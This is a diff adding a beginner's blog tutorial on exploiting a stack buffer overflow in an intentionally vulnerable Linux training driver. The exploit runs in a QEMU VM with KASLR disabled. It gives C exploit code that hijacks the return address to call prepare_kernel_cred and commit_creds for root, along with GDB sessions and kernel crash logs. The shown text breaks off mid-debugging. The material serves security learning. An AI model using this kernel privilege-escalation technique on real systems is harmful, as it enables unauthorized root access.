@@ -1,0 +1,520 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<meta http-equiv="X-UA-Compatible" content="ie=edge">
+	<meta name="theme-color" content="#ffffff">
+	<meta name="msapplication-TileColor" content="#ffffff">
+<meta itemprop="name" content="Hello, kernel: Exploiting an intentionally vulnerable Linux driver [Part 1]">
+<meta itemprop="description" content="A beginers guide into a Linux Kernel stack overflow vulnerability.">
+<meta itemprop="datePublished" content="2020-04-28T18:01:34-03:00" />
+<meta itemprop="dateModified" content="2020-04-28T18:01:34-03:00" />
+<meta itemprop="wordCount" content="3407">
+
+
+
+<meta itemprop="keywords" content="linux,kernel,exploit,exploitation,stack,overflow," /><meta property="og:title" content="Hello, kernel: Exploiting an intentionally vulnerable Linux driver [Part 1]" />
+<meta property="og:description" content="A beginers guide into a Linux Kernel stack overflow vulnerability." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://mdanilor.github.io/en/posts/hello-kernel/" />
+<meta property="article:published_time" content="2020-04-28T18:01:34-03:00" />
+<meta property="article:modified_time" content="2020-04-28T18:01:34-03:00" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Hello, kernel: Exploiting an intentionally vulnerable Linux driver [Part 1]"/>
+<meta name="twitter:description" content="A beginers guide into a Linux Kernel stack overflow vulnerability."/>
+
+	<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+	<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+	<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+	<link rel="manifest" href="/site.webmanifest">
+	<link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+	<link rel="shortcut icon" href="/favicon.ico">
+
+	<title>Hello, kernel: Exploiting an intentionally vulnerable Linux driver [Part 1]</title>
+	<link rel="stylesheet" href="https://mdanilor.github.io/css/style.min.eac77496566fd7d5768fd650ddb0b2b181ca6a2d7c5fdd6fe6b8ba4bf47e566f.css" integrity="sha256-6sd0llZv19V2j9ZQ3bCysYHKai18X91v5ri6S/R+Vm8=" crossorigin="anonymous">
+	
+</head>
+
+<body id="page">
+	
+	<header id="site-header" class="animated slideInUp">
+		<div class="hdr-wrapper section-inner">
+			<div class="hdr-left">
+				<div class="site-branding">
+					<a href="https://mdanilor.github.io">Onion Security</a>
+				</div>
+				<nav class="site-nav hide-in-mobile">
+					
+				<a href="https://mdanilor.github.io/posts/">Posts</a>
+				<a href="https://mdanilor.github.io/about-hugo/">About</a>
+
+				</nav>
+			</div>
+			<div class="hdr-right hdr-icons">
+				<span class="hdr-social hide-in-mobile"><a href="https://github.com/mdanilor" target="_blank" rel="noopener me" title="Github"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path></svg></a></span><button id="menu-btn" class="hdr-btn" title="Menu"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></button>
+			</div>
+		</div>
+	</header>
+	<div id="mobile-menu" class="animated fast">
+		<ul>
+			<li><a href="https://mdanilor.github.io/posts/">Posts</a></li>
+			<li><a href="https://mdanilor.github.io/about-hugo/">About</a></li>
+		</ul>
+	</div>
+
+
+	<main class="site-main section-inner thin animated fadeIn faster">
+		<h1>Hello, kernel: Exploiting an intentionally vulnerable Linux driver [Part 1]</h1>
+		<div class="content">
+			<h2 id="hello-kernel-linux-exploiting-an-intentionally-vulnerable-linux-driver-part-1">Hello, Kernel Linux: Exploiting an intentionally vulnerable Linux driver [Part 1]<a href="#hello-kernel-linux-exploiting-an-intentionally-vulnerable-linux-driver-part-1" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+<h3 id="intro-and-setup">Intro and setup<a href="#intro-and-setup" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>About a month ago I started doing some research during both my freetime and work hours (shout out to SiDi for allowing me the time!!!) on Kernel Linux exploitation. I find this to be not only a fascinating topic, but a very useful one too, since one of my primary functions at work is to assess the Android system.</p>
+<p>Ok, so let&rsquo;s get started. By this time you should be at least a little familiar with C and stack overflow exploitation in userland. You should also have a Linux VM running on QEMU attached to GDB. If you don&rsquo;t know how to set this up, don&rsquo;t worry. I had no idea when I started this either. I&rsquo;ll leave you with two blogposts below, the first will show you how to set up a Linux VM on QEMU (it&rsquo;s the same setup I&rsquo;m using here) and the second will show how to attach GDB to it. In addition, I&rsquo;ll leave two more links which should get you familiar with basic kernel development. If you have never developed at least a &ldquo;hello&rdquo; driver or built your own kernel, you should start with these.</p>
+<ul>
+<li>[1] <a href="https://andrealmeid.com/post/2020-03-10-bootstrap-arch/">https://andrealmeid.com/post/2020-03-10-bootstrap-arch/</a></li>
+<li>[2] <a href="http://nickdesaulniers.github.io/blog/2018/10/24/booting-a-custom-linux-kernel-in-qemu-and-debugging-it-with-gdb/">http://nickdesaulniers.github.io/blog/2018/10/24/booting-a-custom-linux-kernel-in-qemu-and-debugging-it-with-gdb/</a></li>
+<li>[3] <a href="https://lkcamp.gitlab.io/lkcamp_docs/unicamp_group/boot/">https://lkcamp.gitlab.io/lkcamp_docs/unicamp_group/boot/</a> - check as many tutorials as you can!</li>
+<li>[4] <a href="https://github.com/R3x/How2Kernel">https://github.com/R3x/How2Kernel</a> - Check out Labs 1 through 3.</li>
+</ul>
+<p>On my setup I&rsquo;m using archlinux 5.6.0+ with KASLR disabled. To disable it, just put <code>-append &quot;nokaslr&quot;</code> arg to your QEMU.
+I know that disabling KASLR is a bit of a turnoff. However, I will go back to bypassing KASLR in future posts. For this time, I&rsquo;ll keep it disabled since it&rsquo;s a beginners guide.</p>
+<h3 id="what-well-be-exploiting">What we&rsquo;ll be exploiting<a href="#what-well-be-exploiting" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>After I took interest on Kernel exploitation, I started looking for some research material. Fortunately, I was able to find plenty of good stuff. I started reading the brilliant book &ldquo;A Guide to Kernel Exploitation: Attacking the Core&rdquo;, but decided to pause my reading for a more practical approach. This repository was an excelent place to start:</p>
+<p>[5] <a href="https://github.com/invictus-0x90/vulnerable_linux_driver">https://github.com/invictus-0x90/vulnerable_linux_driver</a></p>
+<p>As stated by the owner, this is not a CTF. Rather, the vulnerabilities are pretty obvious in order for one to focus on exploitation.</p>
+<p>So you should clone the repository and build it:
+<code>make -C &lt;PATH-TO-LINUX-SOURCE-CODE&gt; M=$(pwd)</code></p>
+<p>If you followed tonyk&rsquo;s tutorial on [1], you should have a shared folder between the host and the VM. That&rsquo;s where you should put the driver so you can load it from the VM.</p>
+<h3 id="part-1-stack-overflow">Part 1: stack overflow<a href="#part-1-stack-overflow" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>In this repository, there are a few vulnerabilities to exploit (artibrary rw, UAF, etc). Today we&rsquo;ll be focusing on the stack overflow. In future posts I shall cover the other vulnerabilities in there, but let&rsquo;s stick with stack overflow for today as you may see the vulnerable code below:</p>
+<pre><code>	static int buffer_overflow(char __user *buff)
+        {
+                char kernel_buff[512];
+                size_t size;
+
+                size = strlen(buff);
+
+                printk(KERN_WARNING &quot;[x] Triggering buffer overflow [x]\n&quot;);
+
+                /**
+                * Pretty simple buffer overflow. We shouldnt be using memcpy to
+                * start with, copy_from_user does bounds checking for us (hence
+                * why its not used here).
+                */
+                memcpy(kernel_buff, buff, size);
+
+                return 0;
+	}
+</code></pre><p>This function may be called from userland by using ioctl. If you don&rsquo;t know what I&rsquo;m talking about, check links [2], [3] and [4] before proceeding.</p>
+<p>So we clearly have an overflow in the function above. The focus today will be on turning this buffer overflow into a privilege escalation.</p>
+<h3 id="the-stack">The stack<a href="#the-stack" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>Since our example relies on a stack overflow, we should understand how the stack works.</p>
+<p>The stack is used to store, amongst other things, local statically alocated variables, register values and return addresses.</p>
+<p>When a function is called (using the x86 call instruction), the current RIP (instruction pointer register) on the caller function is stored in the stack so the callee will be able to know where to return to. In the callee function prologue, the base pointer is also stored in the stack so it can be later recovered in the prologue.</p>
+<p>Another notable aspect of the stack is that it grows from higher addresses to lower ones. So when you push two elements into the stack, the first element pushed should have a higher address than the second.</p>
+<p>Ok, so let&rsquo;s try and visualize it:</p>
+<pre><code>+------------------------+ Lower addresses
+|                        |
+|                        |
+|                        |
+|                        |
+|                        |
+|                        |
+|                        |
+|                        |
+|                        |
+|                        |
+|                        |
+|                        |
+|                        |
++------------------------+ Top of the stack
+|                        | (Stack pointer)
+|                        |
+|                        |
+|  Function A Variables  |
+|                        |
+|                        |
+|                        |
++------------------------+ Base of the stack
+|                        | (Base pointer)
+|                        |
+|    ...                 |
+|                        |
+|                        |
++------------------------+Higher addresses
+</code></pre><p>Here we see the stack during the execution of some A function. Let&rsquo;s supose now that the A function calls a B function. The following should happen:</p>
+<ul>
+<li>The A function call instruction should push the return address into the stack so when B executes the RET instruction, it pops the return address from memory and sets the instruction pointer register to it.</li>
+<li>The B function should push the base pointer into the stack so it can be restored upon return.</li>
+</ul>
+<p>The stack should look like this:</p>
+<pre><code>+------------------------+ Lower addresses
+|                        |
+|                        |
+|                        |
+|                        |
+|                        |
++------------------------+Top of stack
+|                        |
+|  Function B Variables  |
+|                        |
++------------------------+Base of stack
+|  Previous base pointer |
++------------------------+
+|  Return address of A   |
++------------------------+
+|                        |
+|                        |
+|                        |
+|  Function A Variables  |
+|                        |
+|                        |
+|                        |
++------------------------+
+|                        |
+|                        |
+|    ...                 |
+|                        |
+|                        |
++------------------------+Higher addresses
+</code></pre><p>So say there&rsquo;s a stack overflow in B. If the overflow is large enough, the attacker should be able to overwrite the previous base pointer and, more interestingly, the return address.</p>
+<p>By overwriting the return address, when function B executes the RET instruction, instead of returning to A, the flow will be redirected to wherever the overwritten address controlled by the attacker points to, causing a flow hijack.</p>
+<p>Time to get our hands dirty!</p>
+<h3 id="writing-our-exploit">Writing our exploit<a href="#writing-our-exploit" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>First things first. Let&rsquo;s make sure that our driver is loaded.</p>
+<pre><code>[root@archlinux src]# insmod vuln_driver.ko
+[68216.283511] [!!!] use_stack_obj @00000000bcfc15f3 [!!!]
+[root@archlinux src]# ls /dev/vulnerable_device -lah
+crw-rw-rw- 1 root root 10, 61 Apr 28 14:04 /dev/vulnerable_device
+[root@archlinux src]# su guest
+[guest@archlinux src]$
+</code></pre><p>I inserted the module, made sure any user could write to or read from it (in /dev/vulnerable_device) and changed the user to an unprivileged one named guest. Let the fun begin!</p>
+<p>Let&rsquo;s write our first code which will simply overflow the buffer:</p>
+<pre><code>#include &lt;sys/ioctl.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &quot;../src/vuln_driver.h&quot;
+#include &lt;sys/types.h&gt;
+#include &lt;string.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;unistd.h&gt;
+
+#define BUF_LEN 512
+
+#define PAYLOAD_LEN BUF_LEN + 100
+
+int main()
+{
+    //Opening the vulnerable device
+    char fd = open(&quot;/dev/vulnerable_device&quot;, O_RDWR);
+    //Payload is set do A's
+    char payload[PAYLOAD_LEN+1];
+    memset(payload, 'A', PAYLOAD_LEN);
+    payload[PAYLOAD_LEN] = '\0';
+    //Sending payload to overflow function
+    ioctl(fd, BUFFER_OVERFLOW, payload);
+    //Releasing the device's FD.
+    close(fd);
+}
+</code></pre><p>All this does is send 612 bytes to the driver buffer (which is allocated to fit only 512 bytes). When we run our exploit, this is what we get:</p>
+<pre><code>[guest@archlinux exploits]$ ./exploit
+[74193.913369] [x] Triggering buffer overflow of size 612 [x]
+[74193.914320] general protection fault: 0000 [#11] SMP PTI
+[74193.914798] CPU: 0 PID: 1782 Comm: exploit Tainted: G      D    O      5.6.0+ #3
+[74193.915452] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS ?-20191223_100556-anatol 04/01/2014
+[74193.916307] RIP: 0010:buffer_overflow+0x5c/0x5d [vuln_driver]
+[74193.916816] Code: 89 e0 48 89 c7 f3 a4 48 c7 c7 a0 10 00 c0 0f be b4 24 ff 01 00 00 e8 79 cb 0b c1 48 31 ff 48 81 7
+[74193.918446] RSP: 0018:ffffc900002f3ed8 EFLAGS: 00010246
+[74193.918904] RAX: 0000000000000000 RBX: 4141414141414141 RCX: 0000000000000000
+[74193.919524] RDX: 0000000000000000 RSI: ffff88813bc18968 RDI: 0000000000000000
+[74193.920144] RBP: 00007fffb1227e90 R08: ffffc900002f3b8d R09: 00000000000003bc
+[74193.920765] R10: ffffc900002f3b88 R11: ffffc900002f3b8d R12: 4141414141414141
+[74193.921385] R13: 00007fffb1227e90 R14: 0000000000000003 R15: ffff88813a18ef00
+[74193.922014] FS:  00007f686d798540(0000) GS:ffff88813bc00000(0000) knlGS:0000000000000000
+[74193.922715] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[74193.923216] CR2: 00007f686d7961b8 CR3: 00000001375a2000 CR4: 00000000000006f0
+[74193.923841] Call Trace:
+[74193.924065]  ? __x64_sys_ioctl+0x11/0x20
+[74193.924414]  ? do_syscall_64+0x43/0x140
+[74193.924753]  ? entry_SYSCALL_64_after_hwframe+0x44/0xa9
+[74193.925222] Modules linked in: vuln_driver(O) [last unloaded: vuln_driver]
+[74193.925870] ---[ end trace 37a63e690f3d98d4 ]---
+[74193.926385] RIP: 0010:0x3
+[74193.926719] Code: Bad RIP value.
+[74193.927022] RSP: 0018:ffffc90000343ef0 EFLAGS: 00010246
+[74193.927633] RAX: 0000000000000000 RBX: 4242424242424242 RCX: 0000000000000000
+[74193.928429] RDX: 0000000000000000 RSI: ffffffff82445440 RDI: ffff88813742dcc0
+[74193.929221] RBP: 000055af0edbc2b0 R08: ffff88813bc2d3a0 R09: ffff8881377c3b20
+[74193.929946] R10: 0000000000000400 R11: 00000000000d0800 R12: 4242424242424242
+[74193.930588] R13: 000055af0edbc2b0 R14: 0000000000000003 R15: ffff88813b0c1000
+[74193.931214] FS:  00007f686d798540(0000) GS:ffff88813bc00000(0000) knlGS:0000000000000000
+[74193.931937] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[74193.932548] CR2: ffffffffffffffd9 CR3: 00000001375a2000 CR4: 00000000000006f0
+Segmentation fault
+
+</code></pre><p>Now, remember: we are trying to hijack the flow of the kernel module. To do that, we must overwrite the return address. It should be 16 bytes after the end of the buffer, since there are 8 bytes for the size variable and 8 bytes for the base pointer. Our payload is:</p>
+<p><code>[BUFFER - 512 bytes] + [PADDING - 16 bytes] + [ADDRESS TO WHERE WE WISH TO HIJACK]</code></p>
+<p>To test this hypothesis, we could put the address of a function we know by the and of our payload and set a breakpoint in that function. If the breakpoint is hit, we should be certain that we are in the right path.</p>
+<p>The function I&rsquo;m going to choose to do this test is the prepare_kernel_cred function. We could have chosen at this point any function within the kernel, however I have chosen this one just because we&rsquo;re actually going to use it in the following section.</p>
+<p>So I&rsquo;ll pause the kernel in GDB and add the breakpoint:</p>
+<pre><code>(gdb) b *prepare_kernel_cred
+Breakpoint 5 at 0xffffffff8108e260: file kernel/cred.c, line 684.
+(gdb)
+</code></pre><p>Not only we put the breakpoint, but we find out that the address for that function is <code>0xffffffff8108e260</code>. The address was found using GDB, but in real life this is usually not possible. KASLR is also disabled in this environment, which is pretty unrealistic in real scenarios. For this moment, we&rsquo;ll stick with this <em>cheating</em> approach, but in future posts we should dive deeper into developing more robust exploits.</p>
+<p>With the address in mind, we modify the exploit to put it by the end of the payload.</p>
+<pre><code>#define BUF_LEN 512
+#define PADDING 16
+#define PAYLOAD_LEN BUF_LEN + PADDING + 8
+
+#define PREPARE_KERNEL_CRED_ADDR { 0x60, 0xe2, 0x08, 0x81, 0xff, 0xff, 0xff, 0xff }
+
+int main()
+{
+    //Opening the vulnerable device
+    char fd = open(&quot;/dev/vulnerable_device&quot;, O_RDWR);
+    //Payload is set do A's
+    char payload[PAYLOAD_LEN+1];
+    char prepare_kernel_cred[] = PREPARE_KERNEL_CRED_ADDR;
+    memset(payload, 'A', BUF_LEN + PADDING);
+    memcpy(payload + BUF_LEN + PADDING, prepare_kernel_cred, 8);
+    payload[PAYLOAD_LEN] = '\0';
+    printf(&quot;Payload: %s\n&quot;, payload);
+    //Sending payload to overflow function
+    ioctl(fd, BUFFER_OVERFLOW, payload);
+    //Releasing the device's FD.
+    close(fd);
+}
+</code></pre><p>When the exploit has ran, we notice that it, in fact, DOES hit the breakpoint! That&rsquo;s great news!</p>
+<pre><code>(gdb) b *prepare_kernel_cred
+Breakpoint 5 at 0xffffffff8108e260: file kernel/cred.c, line 684.
+(gdb) c
+Continuing.
+
+Breakpoint 5, prepare_kernel_cred (daemon=0x0 &lt;fixed_percpu_data&gt;) at kernel/cred.c:684
+684		new = kmem_cache_alloc(cred_jar, GFP_KERNEL);
+(gdb)
+</code></pre><p>Now we go back to why we chose this function for our test.</p>
+<h3 id="finding-a-good-gadget-chain-for-privilege-escalation">Finding a good gadget chain for privilege escalation<a href="#finding-a-good-gadget-chain-for-privilege-escalation" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>We are able to redirect the flow of execution to wherever we please throughout the kernel. The goal here is to escalate privileges to root. But how do we do that?</p>
+<p>In order to find that out, we must first learn how the kernel stores a process&rsquo; credentials.</p>
+<p>Every thread in Linux has information stored in a struct named task_struct. According to Linux&rsquo;s own documentation, task_struct holds a pointer to another struct named creds:</p>
+<p><code>In Linux, all of a task’s credentials are held in (uid, gid) or through (groups, keys, LSM security) a refcounted structure of type ‘struct cred’. Each task points to its credentials by a pointer called ‘cred’ in its task_struct.</code></p>
+<p>(<a href="https://www.kernel.org/doc/html/v4.14/security/credentials.html#types-of-credentials">https://www.kernel.org/doc/html/v4.14/security/credentials.html#types-of-credentials</a>)</p>
+<p>In fact, if one executes a <code>ptype struct task_struct</code> on GDB, the attribute is found:</p>
+<pre><code>(gdb) ptype struct task_struct
+type = struct task_struct {
+    struct thread_info thread_info;
+    volatile long state;
+    void *stack;
+(...)
+    const struct cred *cred;
+(...)
+
+
+</code></pre><p>We may also check out the cred struct while we are at it:</p>
+<pre><code>(gdb) ptype struct cred
+type = struct cred {
+    atomic_t usage;
+    kuid_t uid;
+    kgid_t gid;
+    kuid_t suid;
+    kgid_t sgid;
+    kuid_t euid;
+    kgid_t egid;
+    kuid_t fsuid;
+    kgid_t fsgid;
+(...)
+</code></pre><p>Notice the uid and gid attributes. If they are changed to zero, the process will be executed as root. The values of  <code>euid</code> and <code>egid</code> attributes (effective uid and effective gid) must also be altered for this to work. To our luck, this can be done by calling the <code>commit_creds(struct cred *)</code> function with a valid pointer to a root cred struct. The pointer can be obtained by calling the <code>prepare_kernel_cred(struct *task_struct)</code> with a NULL value to its argument. Hence, the following function call must be made: <code>commit_creds(prepare_kernel_cred(NULL))</code>.</p>
+<p>(This is why our example function was prepare_kernel_cred!)</p>
+<p>Finally, we must also make sure that after the two functions execute, the stack and the registers will be in a good enough state for the driver to gracefully exit and return to userland without a crash. If we get privilege escalation along with a kernel panic or a program crash, it would all have been for nothing.</p>
+<h3 id="crafting-our-payload">Crafting our payload<a href="#crafting-our-payload" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>So far we managed to redirect the execution flow to the prepare_kernel_cred function. As we hit the breakpoint, we may see the stack state and the registers as soon as we enter the function:</p>
+<pre><code>(gdb) info registers
+rax            0x0                 0
+rbx            0x4141414141414141  4702111234474983745
+rcx            0x0                 0
+rdx            0x0                 0
+rsi            0xffff88813bc18968  -131386342012568
+rdi            0x0                 0
+rbp            0x7ffdd3e39710      0x7ffdd3e39710
+rsp            0xffffc90000313ee0  0xffffc90000313ee0
+r8             0xffffc90000313b8d  -60473136301171
+r9             0x44f               1103
+r10            0xffffc90000313b88  -60473136301176
+r11            0xffffc90000313b8d  -60473136301171
+r12            0x4141414141414141  4702111234474983745
+r13            0x7ffdd3e39710      140728158361360
+r14            0x3                 3
+r15            0xffff88813a1a0500  -131386369768192
+rip            0xffffffff8108e260  0xffffffff8108e260 &lt;prepare_kernel_cred&gt;
+</code></pre><pre><code>(gdb) info stack
+#0  prepare_kernel_cred (daemon=0x0 &lt;fixed_percpu_data&gt;) at kernel/cred.c:684
+#1  0x00007ffdd3e39710 in ?? ()
+#2  0x0000000000000003 in fixed_percpu_data ()
+#3  0x000000008008fe01 in ?? ()
+#4  0xffffffff811ee992 in vfs_ioctl (arg=&lt;optimized out&gt;, cmd=&lt;optimized out&gt;, filp=&lt;optimized out&gt;) at fs/ioctl.c:47
+#5  ksys_ioctl (fd=3, cmd=3554907920, arg=140728158361360) at fs/ioctl.c:763
+#6  0xffffffff811ee9e1 in __do_sys_ioctl (arg=&lt;optimized out&gt;, cmd=&lt;optimized out&gt;, fd=&lt;optimized out&gt;) at fs/ioctl.c:772
+#7  __se_sys_ioctl (arg=&lt;optimized out&gt;, cmd=&lt;optimized out&gt;, fd=&lt;optimized out&gt;) at fs/ioctl.c:770
+#8  __x64_sys_ioctl (regs=&lt;optimized out&gt;) at fs/ioctl.c:770
+#9  0xffffffff81002883 in do_syscall_64 (nr=&lt;optimized out&gt;, regs=0xffffc90000313f58) at arch/x86/entry/common.c:295
+#10 0xffffffff81c0008c in entry_SYSCALL_64 () at arch/x86/entry/entry_64.S:175
+#11 0x0000000000000000 in ?? ()
+</code></pre><p>If you check out the calling convention for x86_64 Linux, you&rsquo;ll see that RDI is used to pass the first argument on a function call. That&rsquo;s great news, since RDI is already zero when the prepare_kernel_cred function is called (and, as you may remember, the parameter needed to be NULL).</p>
+<p>You may check the calling convention here: <a href="https://en.wikipedia.org/wiki/X86_calling_conventions#List_of_x86_calling_conventions">https://en.wikipedia.org/wiki/X86_calling_conventions#List_of_x86_calling_conventions</a></p>
+<p>We see plenty of return addresses in the stack. We must preserve them if we want to avoid a system crash or a kernel oops. Fortunately, we have room to work with before we start messing with these return addresses.</p>
+<p>While preserving the return addresses, we should add one address of our own: the commmit_creds address. So our payload will not be:
+<code>[BUFFER - 512 bytes] + [PADDING - 16 bytes] + [PREPARE_KERNEL_CRED] + [COMMIT_CREDS] </code></p>
+<p>Since there&rsquo;s no KASLR here, the address for commit_creds can be found by putting a breakpoint into it. As root, one may also get it from /proc/kallsys.</p>
+<pre><code> (gdb) b commit_creds
+Breakpoint 7 at 0xffffffff8108de20: file ./arch/x86/include/asm/current.h, line 15.
+</code></pre><p>So the breakpoint is set. Let&rsquo;s see what happens. Below is the code with the commit_creds address added to it:</p>
+<pre><code>#define BUF_LEN 512
+#define PADDING 16
+#define INTLEN 8
+#define PAYLOAD_LEN BUF_LEN + PADDING + INTLEN + INTLEN
+
+
+#define PREPARE_KERNEL_CRED_ADDR { 0x60, 0xe2, 0x08, 0x81, 0xff, 0xff, 0xff, 0xff }
+#define COMMIT_CREDS_ADDR { 0x20, 0xde, 0x08, 0x81, 0xff, 0xff, 0xff, 0xff}
+
+
+int main()
+{
+    //Opening the vulnerable device
+    char fd = open(&quot;/dev/vulnerable_device&quot;, O_RDWR);
+    //Payload is set do A's
+    char payload[PAYLOAD_LEN+1];
+    char prepare_kernel_cred[] = PREPARE_KERNEL_CRED_ADDR;
+    char commit_creds[] = COMMIT_CREDS_ADDR;
+    memset(payload, 'A', BUF_LEN + PADDING);
+    memcpy(payload + BUF_LEN + PADDING, prepare_kernel_cred, INTLEN);
+    memcpy(payload + BUF_LEN + PADDING + INTLEN, commit_creds, INTLEN);
+    payload[PAYLOAD_LEN] = '\0';
+    printf(&quot;Payload: %s\n&quot;, payload);
+    //Sending payload to overflow function
+    ioctl(fd, BUFFER_OVERFLOW, payload);
+    //Releasing the device's FD.
+    close(fd);
+}
+</code></pre><p>We run and it hits the first breakpoint in prepare_kernel_creds. As we continue, it hits the second breakpoint in commit_creds. As we print the registers state, we find this:</p>
+<pre><code>Breakpoint 7, commit_creds (new=0xffff88813a2dcf00) at ./arch/x86/include/asm/current.h:15
+15		return this_cpu_read_stable(current_task);
+(gdb) i r
+rax            0xffff88813a2dcf00  -131386368471296
+rbx            0x4141414141414141  4702111234474983745
+rcx            0x0                 0
+rdx            0xffff8881375040c0  -131386416545600
+rsi            0x0                 0
+rdi            0xffff88813a2dcf00  -131386368471296
+rbp            0x7ffcdbcdb320      0x7ffcdbcdb320
+rsp            0xffffc90000333ee8  0xffffc90000333ee8
+r8             0xffff88813bc2d3a0  -131386341928032
+r9             0xffff8881375040c0  -131386416545600
+r10            0x400               1024
+r11            0x5d000             380928
+r12            0x4141414141414141  4702111234474983745
+r13            0x7ffcdbcdb320      140723996177184
+r14            0x3                 3
+r15            0xffff88813a193000  -131386369822720
+rip            0xffffffff8108de20  0xffffffff8108de20 &lt;commit_creds&gt;
+eflags         0x202               [ IOPL=0 IF ]
+
+</code></pre><p>Following the calling convention, the return value of a function is provided in the RAX register. It is very fortunate that RAX is equals to RDI, which means that the argument register has already been set to the credentials pointer somewhere along the way. It seems that we are ready to go!</p>
+<p>However, after continuing the program I get a crash.</p>
+<p>Running it again and looking at the stack at the moment the commit creds function is called, we notice this:</p>
+<pre><code>(gdb) i s
+#0  commit_creds (new=0xffff88813a2dcf00) at ./arch/x86/include/asm/current.h:15
+#1  0x0000000000000003 in fixed_percpu_data ()
+#2  0x000000008008fe01 in ?? ()
+#3  0xffffffff811ee992 in vfs_ioctl (arg=&lt;optimized out&gt;, cmd=&lt;optimized out&gt;, filp=&lt;optimized out&gt;) at fs/ioctl.c:47
+#4  ksys_ioctl (fd=3, cmd=3687691040, arg=140723996177184) at fs/ioctl.c:763
+#5  0xffffffff811ee9e1 in __do_sys_ioctl (arg=&lt;optimized out&gt;, cmd=&lt;optimized out&gt;, fd=&lt;optimized out&gt;)
+    at fs/ioctl.c:772
+#6  __se_sys_ioctl (arg=&lt;optimized out&gt;, cmd=&lt;optimized out&gt;, fd=&lt;optimized out&gt;) at fs/ioctl.c:770
